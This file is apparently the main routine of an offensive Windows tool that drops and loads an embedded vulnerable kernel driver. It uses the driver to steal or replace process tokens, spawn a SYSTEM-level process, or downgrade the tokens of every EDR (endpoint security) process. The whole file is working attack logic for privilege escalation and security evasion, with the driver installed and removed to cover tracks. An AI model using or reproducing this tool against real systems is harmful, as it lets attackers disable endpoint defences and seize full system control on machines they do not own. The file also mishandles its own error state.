#include "common.h"
#include "vdriver.h"

// Print help message
void printHelp(char* fileName) {
	printf("Usage: %s --tp <PID> --sp <PID>\n", fileName);
	printf("Usage: %s --edr\n", fileName);
	printf("Usage: %s --edr --sp <PID>\n", fileName);
	printf("Options:\n");
	printf("  --tp <pid>             Specify the target process ID (PID) to replace the token of\n");
	printf("  --sp <pid>             Specify the source process ID (PID) to clone the token from\n");
	printf("  --edr                  Specify to downgrade the token of all EDR processes\n");
	printf("  --spawnsystem          Specify to spawn a new process and steal token from system\n");
	printf("  -h                     Display this help message.\n");
}

int main(int argc, char** argv) {

	BOOL	bSTATE					= TRUE;
	BOOL	bDowngradeEDR			= FALSE; // Value to run the Downgrade EDR function
	BOOL	bNewSystemProcess				= FALSE; // Value to run the NewProcess function
	DWORD64 dwTargetPID				= 0;	// Store target PID value
	DWORD64 dwSourcePID				= 0;	// Store sourcec PID value
	LPWSTR	szVulnDriverPath		= NULL;	// Stores the driver path

	// If not enough arguments are supplied print the help function
	if (argc < 2) {
		printHelp(argv[0]);
		return EXIT_FAILURE;
	}

	// Parse the arguments
	for (int i = 1; i < argc; ++i) {
		if (strcmp(argv[i], "--tp") == 0 && i + 1 < argc) {
			dwTargetPID = strtoull(argv[++i], NULL, 10);
		}
		else if (strcmp(argv[i], "--sp") == 0 && i + 1 < argc) {
			dwSourcePID = strtoull(argv[++i], NULL, 10);
		}
		else if (strcmp(argv[i], "--edr") == 0) {
			bDowngradeEDR = TRUE;
		}
		else if (strcmp(argv[i], "--spawnsystem") == 0) {
			bNewSystemProcess = TRUE;
		}
		else if (strcmp(argv[i], "-h") == 0) {
			printHelp(argv[0]);
			return EXIT_SUCCESS;
		}
		else {
			error("Unknown argument: %s", argv[i]);
			printHelp(argv[0]);
			return EXIT_FAILURE;
		}
	}

	// Validate argument combinations
	if (bDowngradeEDR && dwTargetPID != 0) {
		error("The --edr option cannot be used together with --tp.");
		printHelp(argv[0]);
		return EXIT_FAILURE;
	}

	if (dwTargetPID != 0 && dwSourcePID == 0) {
		error("The --tp option requires a corresponding --sp option.");
		printHelp(argv[0]);
		return EXIT_FAILURE;
	}

	// Check if processes exist if supplied
	if (dwSourcePID != 0) {
		if (!CheckIfProcessExists(dwSourcePID)) {
			error("The source process with PID %d used for --sp does not exist", dwSourcePID);
			return EXIT_FAILURE;
		}
	}

	if (dwTargetPID != 0) {
		if (!CheckIfProcessExists(dwTargetPID)) {
			error("The target process with PID %d used for --tp does not exist", dwTargetPID);
			return EXIT_FAILURE;
		}
	}

	// Get the offsets for UniqueProcessId, ActiveProcessLinks and Protection level
	info("GetOffsets - Getting offsets for UniqueProcessId, ActiveProcessLinks and Protection level")
	if (!GetOffsets()) {
		return EXIT_FAILURE;
	}
	PrintOffsets();
	okay("GetOffsets - Retrieved offsets");
	
	// Write the vulnerable driver to the file system
	info("WriteDriverToFile - Writing vulnerable driver to filesystem");
	if (!WriteDriverToFile(g_VULNDRIVERFILENAME, cVDriver, cVDriverLength, &szVulnDriverPath)) {
		error("Failed to write driver to filesystem");
		if (szVulnDriverPath) {
			free(szVulnDriverPath); // Free the allocated memory
		}
		return EXIT_FAILURE;
	}
	okayW(L"WriteDriverToFile - Written vulnerable driver to \"%s\"", szVulnDriverPath);
	printf("\n");
	
	// Load the vulnerable driver as a service
	infoW(L"LoadDriver - Loading vulnerable driver from \"%s\" with name \"%s\"", szVulnDriverPath, g_VULNDRIVERNAME);
	if (!LoadDriver(g_VULNDRIVERNAME, szVulnDriverPath)) {
		error("LoadDriver - Failed to load driver");
		BOOL bSTATE = FALSE;
		goto _cleanUp;
	}
	okayW("LoadDriver - Loaded vulnerable driver, servicename: \"%s\"", g_VULNDRIVERNAME);
	printf("\n");

	if (bDowngradeEDR) {
		info("EDRDownGrade - Running in EDR downgrade mode");
		if (!EDRDownGrade(dwSourcePID)) {
			error("EDRDownGrade - Failed to downgrade tokens of EDR processes");
		}
		okay("EDRDownGrade - Downgraded tokens of EDR processes");
	}
	else if (bNewSystemProcess) {
		info("StartNewSystemProcess - Starting new process and elevating token");
		if (!StartNewSystemProcess()) {                   
			error("StartNewSystemProcess - Failed to start process or elevate token");
		}
		okay("StartNewSystemProcess - Started new process and elevated token");
	}
	else {
		// Replace token of process dwTargetPID with dwSourcePID
		info("ReplaceToken - Replacing token of PID %d with token of PID %d", dwTargetPID, dwSourcePID);
		if (!ReplaceToken(dwTargetPID, dwSourcePID)) {
			error("ReplaceToken - Failed to downgrade token");
			BOOL bSTATE = FALSE;
			goto _cleanUp;
		}
		okay("ReplaceToken - Downgraded token of PID %d with token of PID %d", dwTargetPID, dwSourcePID);
		printf("\n");
	}
	
_cleanUp:

	// ** CLEANUP SECTION ** //
	
	// Unloading vulnerable driver
	infoW(L"UnloadDriver - Unloading vulnerable driver \"%s\"", g_VULNDRIVERNAME);
	if (!UnloadDriver(g_VULNDRIVERNAME)) {
		error("UnloadDriver - Failed to unload driver");
		BOOL bSTATE = FALSE;
	}
	okayW("UnloadDriver - Unloaded vulnerable driver \"%s\"", g_VULNDRIVERNAME);
	printf("\n");
	
	// Remove vulnerable driver from filesystem
	infoW(L"RemoveFileW - Vulnerable driver \"%s\"", szVulnDriverPath);
	if (!RemoveFileW(szVulnDriverPath)) {
		error("RemoveFileW - Failed to delete file");
		BOOL bSTATE = FALSE;
	}
	okayW("RemoveFileW - Deleted vulnerable driver \"%s\"", szVulnDriverPath);
	printf("\n");
	
	// Free allocated memory
	if (szVulnDriverPath != NULL) {
		free(szVulnDriverPath);
	}

	if (bSTATE) {
		return EXIT_SUCCESS;
	}
	else {
		return EXIT_FAILURE;
	}
	
}